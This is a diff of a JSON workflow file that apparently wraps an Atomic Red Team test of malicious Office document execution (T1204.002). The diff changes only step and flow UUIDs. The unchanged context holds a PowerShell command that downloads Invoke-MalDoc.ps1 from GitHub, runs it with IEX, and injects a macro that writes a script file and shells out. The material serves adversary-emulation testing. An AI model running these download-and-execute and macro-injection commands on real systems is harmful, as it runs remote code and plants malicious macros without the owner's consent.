@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "b89a31cc-ad15-44ae-a1c9-f40e01216c62",
+      "id": "d75a12ee-78b2-4988-8d83-db912d18154e",
       "type": "execute-command",
       "data": {
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "aaec20da-7545-4a11-beae-812cb4a453eb",
+      "id": "58de406e-dd9a-434a-972d-ababe7518f84",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item #{jse_path} -ErrorAction Ignore\n",
@@ -25,7 +25,7 @@
       "elevation_required": false
     },
     {
-      "id": "423e5b6c-7abd-4313-ac54-0263475b099d",
+      "id": "d56df45a-db4b-4197-8841-4fa17e8b76b9",
       "name": "Check dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": false
     },
     {
-      "id": "228dc963-e3ca-459e-8b26-d87817b73a2f",
+      "id": "d7ab9ff3-4dff-4124-80f4-92fbd59d40b0",
       "name": "Resolve dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": false
     },
     {
-      "id": "12e21e73-24dd-4cea-9133-3ebcbbec9a6e",
+      "id": "1a3e59f3-4dde-4ec3-9193-51e5d6f95d98",
       "name": "Re-check dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -60,34 +60,34 @@
   ],
   "flows": [
     {
-      "s": "b89a31cc-ad15-44ae-a1c9-f40e01216c62",
+      "s": "d75a12ee-78b2-4988-8d83-db912d18154e",
       "p": "on-success",
-      "o": "aaec20da-7545-4a11-beae-812cb4a453eb"
+      "o": "58de406e-dd9a-434a-972d-ababe7518f84"
     },
     {
-      "s": "b89a31cc-ad15-44ae-a1c9-f40e01216c62",
+      "s": "d75a12ee-78b2-4988-8d83-db912d18154e",
       "p": "on-failure",
-      "o": "aaec20da-7545-4a11-beae-812cb4a453eb"
+      "o": "58de406e-dd9a-434a-972d-ababe7518f84"
     },
     {
-      "s": "423e5b6c-7abd-4313-ac54-0263475b099d",
+      "s": "d56df45a-db4b-4197-8841-4fa17e8b76b9",
       "p": "on-success",
-      "o": "b89a31cc-ad15-44ae-a1c9-f40e01216c62"
+      "o": "d75a12ee-78b2-4988-8d83-db912d18154e"
     },
     {
-      "s": "423e5b6c-7abd-4313-ac54-0263475b099d",
+      "s": "d56df45a-db4b-4197-8841-4fa17e8b76b9",
       "p": "on-failure",
-      "o": "228dc963-e3ca-459e-8b26-d87817b73a2f"
+      "o": "d7ab9ff3-4dff-4124-80f4-92fbd59d40b0"
     },
     {
-      "s": "228dc963-e3ca-459e-8b26-d87817b73a2f",
+      "s": "d7ab9ff3-4dff-4124-80f4-92fbd59d40b0",
       "p": "on-success",
-      "o": "12e21e73-24dd-4cea-9133-3ebcbbec9a6e"
+      "o": "1a3e59f3-4dde-4ec3-9193-51e5d6f95d98"
     },
     {
-      "s": "12e21e73-24dd-4cea-9133-3ebcbbec9a6e",
+      "s": "1a3e59f3-4dde-4ec3-9193-51e5d6f95d98",
       "p": "on-failure",
-      "o": "b89a31cc-ad15-44ae-a1c9-f40e01216c62"
+      "o": "d75a12ee-78b2-4988-8d83-db912d18154e"
     }
   ],
   "tags": [
